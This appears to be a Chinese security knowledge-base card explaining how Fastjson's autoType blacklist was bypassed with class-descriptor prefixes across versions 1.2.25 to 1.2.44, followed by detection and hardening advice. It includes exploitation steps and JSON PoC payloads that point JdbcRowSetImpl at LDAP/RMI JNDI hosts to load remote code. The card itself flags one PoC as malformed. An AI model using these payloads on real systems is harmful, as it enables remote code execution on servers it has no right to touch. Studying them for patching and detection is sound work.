---
id: web-java-deser-fastjson-autotype-descriptor-bypass-evolution
title: Fastjson checkAutoType 类描述符绕过演进：1.2.25 L; → 1.2.42 LL;; → 1.2.43 [ → 1.2.44 修复
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-autotype-descriptor-bypass-evolution
aliases:
- Fastjson 类描述符绕过
- L; 绕过
- LL;; 绕过
- '[com.sun.rowset.JdbcRowSetImpl;'
- Fastjson 1.2.25 1.2.42 1.2.43
- TypeUtils.loadClass 递归
tags:
- java
- fastjson
- deserialization
- autotype
- blacklist-bypass
- descriptor
- jdbcrowset
- jndi
- version-evolution
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: fastjson 1.2.25-1.2.44（原文标记 1.2.25 <= fastjson <= 1.2.44；1.2.44 为 [ 检测修复版）
verification:
  verified_by: verifier-V306
  verified_at: '2026-11-08T11:37:07+08:00'
  notes: 已对照原文与 37 张图核对：1.2.25 loadClass 描述符递归、1.2.42 denyHashCodes 单层截断、1.2.44 [ 修复与截图一致；1.2.43 [ 绕过原文 PoC 为畸形 JSON 且与截图有出入，卡内已标注需按版本实测；PoC 未在本机复跑
---

## 一句话结论

Fastjson 1.2.25 的 `checkAutoType` 用 `denyList` 前缀匹配类名，但 `TypeUtils.loadClass` 会把 `[` 当数组描述符、把 `L...;` 当对象描述符递归剥离后再加载；因此把 `@type` 写成 `[com.sun.rowset.JdbcRowSetImpl;` 或 `LLcom.sun.rowset.JdbcRowSetImpl;;` 就能让黑名单匹配不到 `com.sun.`，而最终仍加载 `JdbcRowSetImpl` 触发 JNDI。1.2.42 引入哈希黑名单但只处理单层描述符，双写仍绕过；1.2.43 增加 `[` 检测但仍有变体；1.2.44 才对 `[` 直接抛异常修复。

## 原理

- **1.2.25 黑名单**：`ParserConfig` 默认 `autoTypeSupport=false`，`denyList` 含 `bsh`、`com.mchange`、`com.sun.`、`java.lang.Thread`、`java.net.Socket`、`java.rmi`、`javax.xml`、`org.apache.bcel`、`org.apache.commons.beanutils`、`org.apache.commons.collections.Transformer` 等前缀；`checkAutoType` 在未开启 autoType 时先按 `className.startsWith(deny)` 匹配黑名单，再匹配白名单；只有开启 autoType 或 `expectClass != null` 才调用 `TypeUtils.loadClass`。
- **`loadClass` 的描述符递归**：`TypeUtils.loadClass(String className, ClassLoader classLoader)` 的逻辑：
  ```java
  if (className.charAt(0) == '[') {
      Class<?> componentType = loadClass(className.substring(1), classLoader);
      return Array.newInstance(componentType, 0).getClass();
  } else if (className.startsWith("L") && className.endsWith(";")) {
      String newClassName = className.substring(1, className.length() - 1);
      return loadClass(newClassName, classLoader);
  } else {
      ... classLoader.loadClass(className) / Class.forName(className) ...
  }
  ```
  黑名单只对原始 `@type` 字符串做前缀匹配；`[com.sun.rowset.JdbcRowSetImpl;` 前缀是 `[`、`LLcom.sun.rowset.JdbcRowSetImpl;;` 前缀是 `L`，都不命中 `com.sun.`，但递归剥离后最终加载的是 `com.sun.rowset.JdbcRowSetImpl`。
- **1.2.42 哈希黑名单**：新增 `denyHashCodes`，用 `BASIC=-3750763034362895579L`、`PRIME=1099511628211L` 对类名首/尾字符算哈希：若 `((BASIC ^ charAt(0)) * PRIME ^ charAt(len-1)) * PRIME == 655701488918567152L`，则把 `className` 截成 `substring(1, len-1)`，再判断 `((BASIC ^ charAt(0))*PRIME ^ charAt(1))*PRIME == 655656408941810501L` 才抛异常；它只处理一层 `L...;`，而 `loadClass` 仍递归，所以 `LLcom.sun.rowset.JdbcRowSetImpl;;` 双写可绕过。
- **1.2.43 的 `[` 绕过**：文章称该版本对类描述符过滤仍不严格，可在 `@type` 前加 `[` 绕过（原文所附 PoC 为 `[com.sun.rowset.JdbcRowSetImpl"[` 一类畸形 JSON，且相邻截图显示已有 `[` 的哈希判断 `h1 == -5808493101479473382L`，原文叙述与截图存在出入，需按目标版本实测）。
- **1.2.44 修复**：`checkAutoType` 对 `[` 类描述符直接抛 `autoType is not support`，相对堵住了这条描述符递归路径；但黑名单本身仍无法穷尽第三方类（见关联卡）。
- **为什么有效**：黑名单是“字符串前缀”层，而 `loadClass` 是“描述符语法”层；两层对同一个 `@type` 的解释不一致，导致安全判断与实际加载的类不同。

## 触发条件

- 目标使用 Fastjson 1.2.25–1.2.43（未打对应修复），且 `checkAutoType` 的 `autoTypeSupport` 已开启（或通过其他方式满足 `expectClass` 条件，视版本）。
- 目标 classpath 存在可被 JNDI/字节码利用的类（如 `com.sun.rowset.JdbcRowSetImpl`、`TemplatesImpl` 等）。
- 攻击者能控制 JSON 请求体的 `@type` 字段；有可用的 JNDI/LDAP/RMI 或本地 gadget 服务。
- 版本探测确认目标落在描述符绕过仍有效的区间（1.2.44+ 对 `[` 直接拒绝）。

## 利用步骤

1. 用版本/依赖探测确认 Fastjson 版本与 autoType 状态（见 `[[web-java-deser-fastjson-recon-version-dependency-probe]]`）。
2. 1.2.25 场景：构造 `@type` 为 `[com.sun.rowset.JdbcRowSetImpl;` 或 `LLcom.sun.rowset.JdbcRowSetImpl;;`，配合 `dataSourceName` 与 `autoCommit` 触发 JNDI。
3. 1.2.42 场景：尝试双写描述符 `LLcom.sun.rowset.JdbcRowSetImpl;;`；若被哈希黑名单拦截，换 `[` 变体。
4. 1.2.43 场景：尝试文章给出的 `[` 变体（如 `[com.sun.rowset.JdbcRowSetImpl"[`），观察是否仍能进入 `loadClass`。
5. 搭建 JNDI 服务（LDAP/RMI）返回恶意 Reference/序列化链，或使用本地 TemplatesImpl 字节码链；确认命令执行/回连。
6. 记录生效的 `@type` 形态与版本区间，作为后续目标的指纹。

## PoC

```json
// 1.2.25：数组描述符
{
  "@type": "[com.sun.rowset.JdbcRowSetImpl;",
  "dataSourceName": "ldap://127.0.0.1:1234/Exploit",
  "autoCommit": true
}

// 1.2.25 / 1.2.42：双写对象描述符
{
  "a": {
    "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
    "dataSourceName": "rmi://test.com:9999/TouchFile",
    "autoCommit": true
  }
}

// 1.2.43：文章给出的 [ 变体（需按目标版本验证）
{
  "b": {
    "@type": "[com.sun.rowset.JdbcRowSetImpl"[,
    "dataSourceName": "rmi://test.com:9999/TouchFile",
    "autoCommit": true
  }
}
```

```java
// TypeUtils.loadClass 关键递归（原文源码截图）
if (className.charAt(0) == '[') {
    Class<?> componentType = loadClass(className.substring(1), classLoader);
    return Array.newInstance(componentType, 0).getClass();
} else if (className.startsWith("L") && className.endsWith(";")) {
    String newClassName = className.substring(1, className.length() - 1);
    return loadClass(newClassName, classLoader);
}
```

## 变体与关联

- 变体：描述符可叠加多层 `[[[`、`L...;` 与 `[` 混用；也可利用 `$`/`.` 替换、大小写等解析差异。
- 变体：1.2.42 的哈希只取首/尾/前两个字符，理论上可构造哈希碰撞/截断变形；文章称 1.2.43 的 `[` 描述符仍可绕过，但所给 PoC 为畸形 JSON，有效性待实测。
- 关联：`[[web-java-deser-fastjson-recon-version-dependency-probe]]`（版本/autoType 探测）、`[[web-java-deser-fastjson-1247-class-cache-bypass]]`（1.2.47 的 Class/MiscCodec 缓存绕过）、`[[web-java-deser-fastjson-thirdparty-jndi-factory-blacklist-gap]]`（黑名单无法穷尽第三方类）。
- 关联：`jdbc-rowset.md`（JdbcRowSetImpl JNDI 链）、`[[web-java-deser-fastjson-1268-autocloseable-expectclass-file-rw]]`（1.2.68 expectClass）。
- 边界：1.2.44+ 对 `[` 直接拒绝；autoType 关闭时多数描述符链不可用；目标 classpath 无可用 gadget/JNDI 时只能造成报错。文章部分 PoC 为演示性、含畸形 JSON，需按版本实测。

## 检测与防御

- 检测：`@type` 值以 `[`、`L` 开头或以 `;` 结尾；类名含多层描述符 `LL`/`[[`；请求体出现 `JdbcRowSetImpl`、`TemplatesImpl`、`dataSourceName`、`autoCommit` 等特征。
- 修复：升级到 1.2.44+ 并关闭 autoType；使用 safeMode/白名单；不要把用户输入直接交给 `JSON.parseObject` 的 autoType 路径。
- 加固：WAF/网关对 `@type` 描述符做归一化（先剥离 `[`/`L...;` 再匹配黑名单）；JNDI 禁用远程 codebase/Reference；JDK 升级到限制 LDAP 远程加载的版本。
- 监控：对 Fastjson 异常、JNDI/LDAP/RMI 外联、`JdbcRowSetImpl` 类加载做告警。
